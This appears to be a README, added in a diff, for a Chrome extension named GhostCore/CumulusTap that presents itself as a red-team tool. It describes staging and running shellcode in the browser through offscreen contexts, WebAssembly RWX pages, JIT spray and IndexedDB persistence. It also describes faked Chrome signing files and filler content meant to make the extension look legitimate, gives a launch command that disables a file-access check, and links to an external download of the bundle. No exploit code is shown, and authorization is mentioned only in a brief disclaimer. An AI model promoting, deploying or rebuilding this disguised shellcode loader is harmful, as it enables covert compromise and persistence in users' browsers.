@@ -1,0 +1,75 @@
+╔══════════════════════════════════════╗
+║     G H O S T C O R E   V E R S I O N     ║
+╚══════════════════════════════════════╝
+» CumulusTap – Red Team Extension Loader
+» v1.0.0 / "Umbra Seed"
+
+"Inject the silence. Speak in memory."
+🧬 PURPOSE
+This is a modular red team extension designed to leverage Chromium’s offscreen rendering, IndexedDB storage, and controlled memory corruption to stage and detonate shellcode inside the browser runtime. Stealth-first. Sandbox-aware. Persistence-optional.
+
+📁 FILE STRUCTURE
+manifest.json – Core config. Declares offscreen context, background script, permissions.
+
+offscreen.html – Hidden execution layer. Stages JS & WASM away from prying eyes.
+
+offscreen_compiled.js – Memory logic lives here. JS primitives + RWX mapping.
+
+background_compiled.js – Trigger orchestration. Could be reactive or scheduled.
+
+exploit.js – Runtime detonation. Precision memory abuse + WebAssembly trampoline.
+
+verified_contents.json – Cosmetic. Mimics Chrome signing for legitimacy.
+
+messages.json – Filler. Gives the extension a mundane face.
+
+🔧 HOW IT WORKS
+Stage: JS primitives open a memory playground using offscreen contexts.
+
+Exploit: RWX page via WebAssembly. Shellcode mapped and written.
+
+Execute: Trampoline invoked through JIT spray or Function call.
+
+Persist (Optional): SQL memory dumps. Extension reloads rehydrate.
+
+🌑 FEATURES
+Offscreen memory manipulation
+
+IndexedDB persistence layer
+
+Arbitrary memory read/write via JS
+
+WebAssembly RWX trampoline
+
+Chrome-native extension shellcode launch
+
+Fully client-side
+
+💀 USE CASES
+Internal red team ops
+
+Post-exploitation browser persistence
+
+Payload staging via browser extension
+
+Sandbox-aware shellcode execution
+
+⚠️ OPERATIONAL NOTES
+Chrome sandbox remains unless chained w/ LPE
+
+File access must be disabled for dev load
+
+Chrome may log offscreen activity – monitor DevTools
+
+Memory offsets may shift per Chrome version – validate pre-deploy
+
+Deployment-
+$ chrome.exe --disable-extensions-file-access-check \
+             --load-extension=/path/to/ghostcore_bundle
+📝 DISCLAIMER
+This tool is designed for authorized adversary simulation only. If you’re using this without permission, you already know you're the problem.
+
+GhostCore doesn’t babysit. It leaves no fingerprints.
+
+"Malware is noisy. Ghosts don’t scream." – GhostCore Manifesto, Line 0x00
+https://drive.proton.me/urls/MZNG3H1P9C#E6B3tjHJ0m16
